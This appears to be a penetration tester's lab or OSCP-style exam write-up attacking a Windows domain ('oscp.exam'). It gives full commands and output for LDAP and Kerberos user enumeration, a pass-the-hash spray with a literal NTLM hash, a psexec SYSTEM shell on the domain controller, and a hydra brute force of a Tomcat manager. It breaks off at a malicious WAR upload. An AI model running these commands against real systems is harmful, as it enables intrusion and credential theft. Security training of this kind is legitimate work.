## DC

### 192.168.123.100

Rustscan and Nmap 
```
┌──(kali㉿kali)-[~/OSCP/exam]
└─$ rustscan 192.168.123.100
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
Faster Nmap scanning with Rust.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Nmap? More like slowmap.🐢

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 192.168.123.100:53
Open 192.168.123.100:88
Open 192.168.123.100:135
Open 192.168.123.100:139
Open 192.168.123.100:389
Open 192.168.123.100:445
Open 192.168.123.100:464
Open 192.168.123.100:593
Open 192.168.123.100:636
Open 192.168.123.100:3268
Open 192.168.123.100:3269
Open 192.168.123.100:5985
Open 192.168.123.100:9389
Open 192.168.123.100:49665
Open 192.168.123.100:49666
Open 192.168.123.100:49667
Open 192.168.123.100:49669
Open 192.168.123.100:49670
Open 192.168.123.100:49673
Open 192.168.123.100:49701
Open 192.168.123.100:53027
[~] Starting Nmap
[>] The Nmap command to be run is nmap -vvv -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49665,49666,49667,49669,49670,49673,49701,53027 192.168.123.100

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-24 02:24 EDT
Initiating Ping Scan at 02:24
Scanning 192.168.123.100 [2 ports]
Completed Ping Scan at 02:24, 3.00s elapsed (1 total hosts)
Nmap scan report for 192.168.123.100 [host down, received no-response]
Read data files from: /usr/bin/../share/nmap
Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn
Nmap done: 1 IP address (0 hosts up) scanned in 3.02 seconds


┌──(kali㉿kali)-[~/OSCP/exam]
└─$ nmap -A -T4 -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49665,49666,49667,49669,49670,49673,49701,53027 192.168.123.100 -Pn
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-24 02:25 EDT
Nmap scan report for 192.168.123.100
Host is up (0.26s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-04-24 06:25:21Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: oscp.exam0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: oscp.exam0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49670/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  msrpc         Microsoft Windows RPC
49701/tcp open  msrpc         Microsoft Windows RPC
53027/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2024-04-24T06:26:18
|_  start_date: N/A
|_clock-skew: -1s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 110.97 seconds
                                                               
```

![[Pasted image 20240425005331.png]]

![[Pasted image 20240425005435.png]]


1. Ldap Enumeration 
```
┌──(kali㉿kali)-[~/OSCP/exam]
└─$ ldapsearch -x -H ldap://192.168.123.100 -D '' -w '' -b "DC=oscp,DC=exam" 
# extended LDIF
#
# LDAPv3
# base <DC=oscp,DC=exam> with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# oscp.exam
dn: DC=oscp,DC=exam

# Administrator, Users, oscp.exam
dn: CN=Administrator,CN=Users,DC=oscp,DC=exam

# Guest, Users, oscp.exam
dn: CN=Guest,CN=Users,DC=oscp,DC=exam
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Guest
description: Built-in account for guest access to the computer/domain
distinguishedName: CN=Guest,CN=Users,DC=oscp,DC=exam
instanceType: 4
whenCreated: 20230228220758.0Z
whenChanged: 20230228220758.0Z
uSNCreated: 8197
memberOf: CN=Guests,CN=Builtin,DC=oscp,DC=exam
uSNChanged: 8197
name: Guest
objectGUID:: g1pVb+YxI0uib/3FjCYg2g==
userAccountControl: 66082
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 0
primaryGroupID: 514
objectSid:: AQUAAAAAAAUVAAAAj2JwZGQmpTyoI6LC9QEAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: Guest
sAMAccountType: 805306368
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=oscp,DC=exam
isCriticalSystemObject: TRUE
dSCorePropagationData: 20230228222639.0Z
dSCorePropagationData: 20230228220851.0Z
dSCorePropagationData: 16010101000417.0Z

# krbtgt, Users, oscp.exam
dn: CN=krbtgt,CN=Users,DC=oscp,DC=exam

# Domain Computers, Users, oscp.exam
dn: CN=Domain Computers,CN=Users,DC=oscp,DC=exam
objectClass: top
objectClass: group
cn: Domain Computers
description: All workstations and servers joined to the domain
distinguishedName: CN=Domain Computers,CN=Users,DC=oscp,DC=exam
instanceType: 4
whenCreated: 20230228220851.0Z
whenChanged: 20230228220851.0Z
uSNCreated: 12330
uSNChanged: 12332
name: Domain Computers
objectGUID:: S42RCBUr40+ltB9pZ3jL1g==
objectSid:: AQUAAAAAAAUVAAAAj2JwZGQmpTyoI6LCAwIAAA==
sAMAccountName: Domain Computers
sAMAccountType: 268435456
groupType: -2147483646
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=oscp,DC=exam
isCriticalSystemObject: TRUE
dSCorePropagationData: 20230228222639.0Z
dSCorePropagationData: 20230228220851.0Z
dSCorePropagationData: 16010101000417.0Z

# Domain Controllers, Users, oscp.exam
dn: CN=Domain Controllers,CN=Users,DC=oscp,DC=exam

# Schema Admins, Users, oscp.exam
dn: CN=Schema Admins,CN=Users,DC=oscp,DC=exam

# Enterprise Admins, Users, oscp.exam
dn: CN=Enterprise Admins,CN=Users,DC=oscp,DC=exam

# Cert Publishers, Users, oscp.exam
dn: CN=Cert Publishers,CN=Users,DC=oscp,DC=exam
objectClass: top
objectClass: group
cn: Cert Publishers
description: Members of this group are permitted to publish certificates to th
 e directory
distinguishedName: CN=Cert Publishers,CN=Users,DC=oscp,DC=exam
instanceType: 4
whenCreated: 20230228220851.0Z
whenChanged: 20230228220851.0Z
uSNCreated: 12342
memberOf: CN=Denied RODC Password Replication Group,CN=Users,DC=oscp,DC=exam
uSNChanged: 12344
name: Cert Publishers
objectGUID:: oVwOycLOV0+eK7lwWSSbyQ==
objectSid:: AQUAAAAAAAUVAAAAj2JwZGQmpTyoI6LCBQIAAA==
sAMAccountName: Cert Publishers
sAMAccountType: 536870912
groupType: -2147483644
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=oscp,DC=exam
isCriticalSystemObject: TRUE
dSCorePropagationData: 20230228222639.0Z
dSCorePropagationData: 20230228220851.0Z
dSCorePropagationData: 16010101000417.0Z

# Domain Admins, Users, oscp.exam
dn: CN=Domain Admins,CN=Users,DC=oscp,DC=exam

# Domain Users, Users, oscp.exam
dn: CN=Domain Users,CN=Users,DC=oscp,DC=exam
objectClass: top
objectClass: group
cn: Domain Users
description: All domain users
distinguishedName: CN=Domain Users,CN=Users,DC=oscp,DC=exam
instanceType: 4
whenCreated: 20230228220851.0Z
whenChanged: 20230228220851.0Z
uSNCreated: 12348
memberOf: CN=Users,CN=Builtin,DC=oscp,DC=exam
uSNChanged: 12350
name: Domain Users
objectGUID:: BtOf2tQ7fECBl5Ry2P9zQw==
objectSid:: AQUAAAAAAAUVAAAAj2JwZGQmpTyoI6LCAQIAAA==
sAMAccountName: Domain Users
sAMAccountType: 268435456
groupType: -2147483646
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=oscp,DC=exam
isCriticalSystemObject: TRUE
dSCorePropagationData: 20230228222639.0Z
dSCorePropagationData: 20230228220851.0Z
dSCorePropagationData: 16010101000417.0Z

# Domain Guests, Users, oscp.exam
dn: CN=Domain Guests,CN=Users,DC=oscp,DC=exam
objectClass: top
objectClass: group
cn: Domain Guests
description: All domain guests
distinguishedName: CN=Domain Guests,CN=Users,DC=oscp,DC=exam
instanceType: 4
whenCreated: 20230228220851.0Z
whenChanged: 20230228220851.0Z
uSNCreated: 12351
memberOf: CN=Guests,CN=Builtin,DC=oscp,DC=exam
uSNChanged: 12353
name: Domain Guests
objectGUID:: mpWGp3bGwUuvxqUNee70Qw==
objectSid:: AQUAAAAAAAUVAAAAj2JwZGQmpTyoI6LCAgIAAA==
sAMAccountName: Domain Guests
sAMAccountType: 268435456
groupType: -2147483646
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=oscp,DC=exam
isCriticalSystemObject: TRUE
dSCorePropagationData: 20230228222639.0Z
dSCorePropagationData: 20230228220851.0Z
dSCorePropagationData: 16010101000417.0Z

# Group Policy Creator Owners, Users, oscp.exam
dn: CN=Group Policy Creator Owners,CN=Users,DC=oscp,DC=exam
objectClass: top
objectClass: group
cn: Group Policy Creator Owners
description: Members in this group can modify group policy for the domain
member: CN=Administrator,CN=Users,DC=oscp,DC=exam
distinguishedName: CN=Group Policy Creator Owners,CN=Users,DC=oscp,DC=exam
instanceType: 4
whenCreated: 20230228220851.0Z
whenChanged: 20230228220851.0Z
uSNCreated: 12354
memberOf: CN=Denied RODC Password Replication Group,CN=Users,DC=oscp,DC=exam
uSNChanged: 12391
name: Group Policy Creator Owners
objectGUID:: DfAOu2OItkqDuN2Fgbssew==
objectSid:: AQUAAAAAAAUVAAAAj2JwZGQmpTyoI6LCCAIAAA==
sAMAccountName: Group Policy Creator Owners
sAMAccountType: 268435456
groupType: -2147483646
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=oscp,DC=exam
isCriticalSystemObject: TRUE
dSCorePropagationData: 20230228222639.0Z
dSCorePropagationData: 20230228220851.0Z
dSCorePropagationData: 16010101000417.0Z

# RAS and IAS Servers, Users, oscp.exam
dn: CN=RAS and IAS Servers,CN=Users,DC=oscp,DC=exam
objectClass: top
objectClass: group
cn: RAS and IAS Servers
description: Servers in this group can access remote access properties of user
 s
distinguishedName: CN=RAS and IAS Servers,CN=Users,DC=oscp,DC=exam
instanceType: 4
whenCreated: 20230228220851.0Z
whenChanged: 20230228220851.0Z
uSNCreated: 12357
uSNChanged: 12359
name: RAS and IAS Servers
objectGUID:: KKciZLY3o0anmyoOmXWhhQ==
objectSid:: AQUAAAAAAAUVAAAAj2JwZGQmpTyoI6LCKQIAAA==
sAMAccountName: RAS and IAS Servers
sAMAccountType: 536870912
groupType: -2147483644
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=oscp,DC=exam
isCriticalSystemObject: TRUE
dSCorePropagationData: 20230228222639.0Z
dSCorePropagationData: 20230228220851.0Z
dSCorePropagationData: 16010101000417.0Z

# Allowed RODC Password Replication Group, Users, oscp.exam
dn: CN=Allowed RODC Password Replication Group,CN=Users,DC=oscp,DC=exam
objectClass: top
objectClass: group
cn: Allowed RODC Password Replication Group
description: Members in this group can have their passwords replicated to all 
 read-only domain controllers in the domain
distinguishedName: CN=Allowed RODC Password Replication Group,CN=Users,DC=oscp
 ,DC=exam
instanceType: 4
whenCreated: 20230228220851.0Z
whenChanged: 20230228220851.0Z
uSNCreated: 12402
uSNChanged: 12404
name: Allowed RODC Password Replication Group
objectGUID:: 68zzqDfIHEyKGevdPWkITA==
objectSid:: AQUAAAAAAAUVAAAAj2JwZGQmpTyoI6LCOwIAAA==
sAMAccountName: Allowed RODC Password Replication Group
sAMAccountType: 536870912
groupType: -2147483644
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=oscp,DC=exam
isCriticalSystemObject: TRUE
dSCorePropagationData: 20230228222639.0Z
dSCorePropagationData: 20230228220851.0Z
dSCorePropagationData: 16010101000417.0Z

# Denied RODC Password Replication Group, Users, oscp.exam
dn: CN=Denied RODC Password Replication Group,CN=Users,DC=oscp,DC=exam
objectClass: top
objectClass: group
cn: Denied RODC Password Replication Group
description: Members in this group cannot have their passwords replicated to a
 ny read-only domain controllers in the domain
member: CN=Read-only Domain Controllers,CN=Users,DC=oscp,DC=exam
member: CN=Group Policy Creator Owners,CN=Users,DC=oscp,DC=exam
member: CN=Domain Admins,CN=Users,DC=oscp,DC=exam
member: CN=Cert Publishers,CN=Users,DC=oscp,DC=exam
member: CN=Enterprise Admins,CN=Users,DC=oscp,DC=exam
member: CN=Schema Admins,CN=Users,DC=oscp,DC=exam
member: CN=Domain Controllers,CN=Users,DC=oscp,DC=exam
member: CN=krbtgt,CN=Users,DC=oscp,DC=exam
distinguishedName: CN=Denied RODC Password Replication Group,CN=Users,DC=oscp,
 DC=exam
instanceType: 4
whenCreated: 20230228220851.0Z
whenChanged: 20230228220851.0Z
uSNCreated: 12405
uSNChanged: 12433
name: Denied RODC Password Replication Group
objectGUID:: ycumM3Yxtk636KtW3lsVOw==
objectSid:: AQUAAAAAAAUVAAAAj2JwZGQmpTyoI6LCPAIAAA==
sAMAccountName: Denied RODC Password Replication Group
sAMAccountType: 536870912
groupType: -2147483644
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=oscp,DC=exam
isCriticalSystemObject: TRUE
dSCorePropagationData: 20230228222639.0Z
dSCorePropagationData: 20230228220851.0Z
dSCorePropagationData: 16010101000417.0Z

# Read-only Domain Controllers, Users, oscp.exam
dn: CN=Read-only Domain Controllers,CN=Users,DC=oscp,DC=exam

# Enterprise Read-only Domain Controllers, Users, oscp.exam
dn: CN=Enterprise Read-only Domain Controllers,CN=Users,DC=oscp,DC=exam
objectClass: top
objectClass: group
cn: Enterprise Read-only Domain Controllers
description: Members of this group are Read-Only Domain Controllers in the ent
 erprise
distinguishedName: CN=Enterprise Read-only Domain Controllers,CN=Users,DC=oscp
 ,DC=exam
instanceType: 4
whenCreated: 20230228220851.0Z
whenChanged: 20230228220851.0Z
uSNCreated: 12429
uSNChanged: 12431
name: Enterprise Read-only Domain Controllers
objectGUID:: SGzNix1N6k6zp18A8MPVQw==
objectSid:: AQUAAAAAAAUVAAAAj2JwZGQmpTyoI6LC8gEAAA==
sAMAccountName: Enterprise Read-only Domain Controllers
sAMAccountType: 268435456
groupType: -2147483640
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=oscp,DC=exam
isCriticalSystemObject: TRUE
dSCorePropagationData: 20230228222639.0Z
dSCorePropagationData: 20230228220851.0Z
dSCorePropagationData: 16010101000417.0Z

# Cloneable Domain Controllers, Users, oscp.exam
dn: CN=Cloneable Domain Controllers,CN=Users,DC=oscp,DC=exam
objectClass: top
objectClass: group
cn: Cloneable Domain Controllers
description: Members of this group that are domain controllers may be cloned.
distinguishedName: CN=Cloneable Domain Controllers,CN=Users,DC=oscp,DC=exam
instanceType: 4
whenCreated: 20230228220851.0Z
whenChanged: 20230228220851.0Z
uSNCreated: 12440
uSNChanged: 12442
name: Cloneable Domain Controllers
objectGUID:: GdVMfoIvxkWsxdUU2+YDDA==
objectSid:: AQUAAAAAAAUVAAAAj2JwZGQmpTyoI6LCCgIAAA==
sAMAccountName: Cloneable Domain Controllers
sAMAccountType: 268435456
groupType: -2147483646
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=oscp,DC=exam
isCriticalSystemObject: TRUE
dSCorePropagationData: 20230228222639.0Z
dSCorePropagationData: 20230228220851.0Z
dSCorePropagationData: 16010101000417.0Z

# Protected Users, Users, oscp.exam
dn: CN=Protected Users,CN=Users,DC=oscp,DC=exam
objectClass: top
objectClass: group
cn: Protected Users
description: Members of this group are afforded additional protections against
  authentication security threats. See http://go.microsoft.com/fwlink/?LinkId=
 298939 for more information.
distinguishedName: CN=Protected Users,CN=Users,DC=oscp,DC=exam
instanceType: 4
whenCreated: 20230228220851.0Z
whenChanged: 20230228220851.0Z
uSNCreated: 12445
uSNChanged: 12447
name: Protected Users
objectGUID:: E+nCyG1Td0+VQlBJrGhXvg==
objectSid:: AQUAAAAAAAUVAAAAj2JwZGQmpTyoI6LCDQIAAA==
sAMAccountName: Protected Users
sAMAccountType: 268435456
groupType: -2147483646
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=oscp,DC=exam
isCriticalSystemObject: TRUE
dSCorePropagationData: 20230228222639.0Z
dSCorePropagationData: 20230228220851.0Z
dSCorePropagationData: 16010101000417.0Z

# Key Admins, Users, oscp.exam
dn: CN=Key Admins,CN=Users,DC=oscp,DC=exam

# Enterprise Key Admins, Users, oscp.exam
dn: CN=Enterprise Key Admins,CN=Users,DC=oscp,DC=exam

# DnsAdmins, Users, oscp.exam
dn: CN=DnsAdmins,CN=Users,DC=oscp,DC=exam
objectClass: top
objectClass: group
cn: DnsAdmins
description: DNS Administrators Group
distinguishedName: CN=DnsAdmins,CN=Users,DC=oscp,DC=exam
instanceType: 4
whenCreated: 20230228220930.0Z
whenChanged: 20230228220930.0Z
uSNCreated: 12485
uSNChanged: 12487
name: DnsAdmins
objectGUID:: Oe3dyunrhEiS7XWp9p2AJg==
objectSid:: AQUAAAAAAAUVAAAAj2JwZGQmpTyoI6LCTQQAAA==
sAMAccountName: DnsAdmins
sAMAccountType: 536870912
groupType: -2147483644
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=oscp,DC=exam
dSCorePropagationData: 20230228222639.0Z
dSCorePropagationData: 16010101000001.0Z

# DnsUpdateProxy, Users, oscp.exam
dn: CN=DnsUpdateProxy,CN=Users,DC=oscp,DC=exam
objectClass: top
objectClass: group
cn: DnsUpdateProxy
description: DNS clients who are permitted to perform dynamic updates on behal
 f of some other clients (such as DHCP servers).
distinguishedName: CN=DnsUpdateProxy,CN=Users,DC=oscp,DC=exam
instanceType: 4
whenCreated: 20230228220930.0Z
whenChanged: 20230228220930.0Z
uSNCreated: 12490
uSNChanged: 12490
name: DnsUpdateProxy
objectGUID:: HD+3/9T1tEe3oYx/GGUFEw==
objectSid:: AQUAAAAAAAUVAAAAj2JwZGQmpTyoI6LCTgQAAA==
sAMAccountName: DnsUpdateProxy
sAMAccountType: 268435456
groupType: -2147483646
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=oscp,DC=exam
dSCorePropagationData: 20230228222639.0Z
dSCorePropagationData: 16010101000001.0Z

# lisa, Users, oscp.exam
dn: CN=lisa,CN=Users,DC=oscp,DC=exam
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: lisa
givenName: lisa
distinguishedName: CN=lisa,CN=Users,DC=oscp,DC=exam
instanceType: 4
whenCreated: 20230228222638.0Z
whenChanged: 20230505174934.0Z
uSNCreated: 12820
uSNChanged: 32790
name: lisa
objectGUID:: Cpo+N7eUY0eRHOub0ybCBQ==
userAccountControl: 66048
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 133220981487030052
pwdLastSet: 133277825748518040
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAj2JwZGQmpTyoI6LCTwQAAA==
accountExpires: 9223372036854775807
logonCount: 2
sAMAccountName: lisa
sAMAccountType: 805306368
lockoutTime: 0
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=oscp,DC=exam
dSCorePropagationData: 20230228222639.0Z
dSCorePropagationData: 16010101000001.0Z
lastLogonTimestamp: 133220973660458295
msDS-SupportedEncryptionTypes: 0

# betty, Users, oscp.exam
dn: CN=betty,CN=Users,DC=oscp,DC=exam

# svc_sql, Users, oscp.exam
dn: CN=svc_sql,CN=Users,DC=oscp,DC=exam
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: svc_sql
givenName: svc_sql
distinguishedName: CN=svc_sql,CN=Users,DC=oscp,DC=exam
instanceType: 4
whenCreated: 20230228222639.0Z
whenChanged: 20240116195539.0Z
uSNCreated: 12836
uSNChanged: 61483
name: svc_sql
objectGUID:: dnO3wTapTE6GsHJr9zLVpA==
userAccountControl: 66048
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 133499098165696480
pwdLastSet: 133277825510807067
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAj2JwZGQmpTyoI6LCUQQAAA==
accountExpires: 9223372036854775807
logonCount: 13
sAMAccountName: svc_sql
sAMAccountType: 805306368
lockoutTime: 0
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=oscp,DC=exam
dSCorePropagationData: 20230228222639.0Z
dSCorePropagationData: 16010101000001.0Z
lastLogonTimestamp: 133499085394659640
msDS-SupportedEncryptionTypes: 0

# search reference
ref: ldap://ForestDnsZones.oscp.exam/DC=ForestDnsZones,DC=oscp,DC=exam

# search reference
ref: ldap://DomainDnsZones.oscp.exam/DC=DomainDnsZones,DC=oscp,DC=exam

# search reference
ref: ldap://oscp.exam/CN=Configuration,DC=oscp,DC=exam

# search result
search: 2
result: 0 Success

# numResponses: 31
# numEntries: 27
# numReferences: 3
```

2. Found Users. Confirmed with kerbrute. 
```
svc_sql
lisa
Administrator
betty
```

![[Pasted image 20240425005016.png]]

![[Pasted image 20240425005036.png]]

![[Pasted image 20240425005102.png]]

![[Pasted image 20240425005205.png]]

```
┌──(kali㉿kali)-[~/OSCP/exam]
└─$ ./kerbrute-l userenum 100users --dc 192.168.123.100 --domain oscp.exam

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 04/24/24 - Ronnie Flathers @ropnop

2024/04/24 09:26:59 >  Using KDC(s):
2024/04/24 09:26:59 >   192.168.123.100:88

2024/04/24 09:26:59 >  [+] VALID USERNAME:       svc_sql@oscp.exam
2024/04/24 09:26:59 >  [+] VALID USERNAME:       Administrator@oscp.exam
2024/04/24 09:26:59 >  [+] VALID USERNAME:       betty@oscp.exam
2024/04/24 09:26:59 >  [+] VALID USERNAME:       lisa@oscp.exam
2024/04/24 09:26:59 >  Done! Tested 4 usernames (4 valid) in 0.261 seconds

```

![[Pasted image 20240425014203.png]]

3. Spray betty user information. 
```
┌──(kali㉿kali)-[~/OSCP/exam]
└─$ netexec smb 192.168.123.100-102 -u betty -H fa680f1c00205958367965bd2102e92c 
SMB         192.168.123.101 445    MS01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:MS01) (domain:oscp.exam) (signing:False) (SMBv1:False)
SMB         192.168.123.100 445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:oscp.exam) (signing:True) (SMBv1:False)
SMB         192.168.123.102 445    MS02             [*] Windows 10 / Server 2019 Build 17763 x64 (name:MS02) (domain:oscp.exam) (signing:False) (SMBv1:False)
SMB         192.168.123.101 445    MS01             [-] oscp.exam\betty:fa680f1c00205958367965bd2102e92c STATUS_TRUSTED_RELATIONSHIP_FAILURE
SMB         192.168.123.100 445    DC01             [+] oscp.exam\betty:fa680f1c00205958367965bd2102e92c (Pwn3d!)
SMB         192.168.123.102 445    MS02             [+] oscp.exam\betty:fa680f1c00205958367965bd2102e92c
Running nxc against 3 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00

```

![[Pasted image 20240425014221.png]]

4. Pass the hash login. And obtained proof.txt 
```
┌──(kali㉿kali)-[~/OSCP/exam]
└─$ impacket-psexec -hashes 00000000000000000000000000000000:fa680f1c00205958367965bd2102e92c betty@192.168.123.100
Impacket v0.12.0.dev1+20240327.181547.f8899e6 - Copyright 2023 Fortra

[*] Requesting shares on 192.168.123.100.....
[*] Found writable share ADMIN$
[*] Uploading file lDuWGHjv.exe
[*] Opening SVCManager on 192.168.123.100.....
[*] Creating service mjme on 192.168.123.100.....
[*] Starting service mjme.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.4010]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```

![[Pasted image 20240425014320.png]]

```
C:\Users\Administrator\Desktop> type proof.txt
e1fd1c4a7530f04db6a90819aabaf06f

C:\Users\Administrator\Desktop> ipconfig
 
Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : 
   IPv4 Address. . . . . . . . . . . : 192.168.123.100
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.123.254

C:\Users\Administrator\Desktop> whoami
nt authority\system
```


![[Pasted image 20240425014426.png]]


### 192.168.123.101

1. Rustscan and Nmap 
```
┌──(kali㉿kali)-[~/OSCP/exam]
└─$ rustscan 192.168.123.101
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
Faster Nmap scanning with Rust.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
🌍HACK THE PLANET🌍

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 192.168.123.101:135
Open 192.168.123.101:139
Open 192.168.123.101:445
Open 192.168.123.101:5985
Open 192.168.123.101:8080
Open 192.168.123.101:49666
Open 192.168.123.101:49665
[~] Starting Nmap
[>] The Nmap command to be run is nmap -vvv -p 135,139,445,5985,8080,49666,49665 192.168.123.101

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-24 02:24 EDT
Initiating Ping Scan at 02:24
Scanning 192.168.123.101 [2 ports]
Completed Ping Scan at 02:24, 3.00s elapsed (1 total hosts)
Nmap scan report for 192.168.123.101 [host down, received no-response]
Read data files from: /usr/bin/../share/nmap
Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn
Nmap done: 1 IP address (0 hosts up) scanned in 3.03 seconds


┌──(kali㉿kali)-[~/OSCP/exam]
└─$ nmap -A -T4 -p 135,139,445,5985,8080,49666,49665 192.168.123.101 -Pn
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-24 02:25 EDT
Nmap scan report for 192.168.123.101
Host is up (0.26s latency).

PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
8080/tcp  open  http          Apache Tomcat 8.5.19
|_http-title: Apache Tomcat/8.5.19
|_http-favicon: Apache Tomcat
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: -1s
| smb2-time: 
|   date: 2024-04-24T06:26:19
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 99.57 seconds
```

![[Pasted image 20240425005715.png]]


2. Start bruteforcing using hydra with usernames both as user and passwords. Obtained Creds
```
┌──(kali㉿kali)-[~/OSCP/exam]
└─$ hydra -L 100users -P 100users -f 192.168.123.101 http-get /manager/html -s 8080
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-04-24 09:33:08
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 16 login tries (l:4/p:4), ~1 try per task
[DATA] attacking http-get://192.168.123.101:8080/manager/html
[8080][http-get] host: 192.168.123.101   login: lisa   password: lisa
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-04-24 09:33:19
```

![[Pasted image 20240425005910.png]]
Reference: https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/tomcat#brute-force-attack

3. Login with lisa:lisa creds on port 8080. Figure out we can upload war file. 
![[Pasted image 20240425010155.png]]

4. Created a malicious war file. Used port 80 as listening port as other ports are blocked by firewall. 
```
┌──(kali㉿kali)-[~/OSCP/exam]
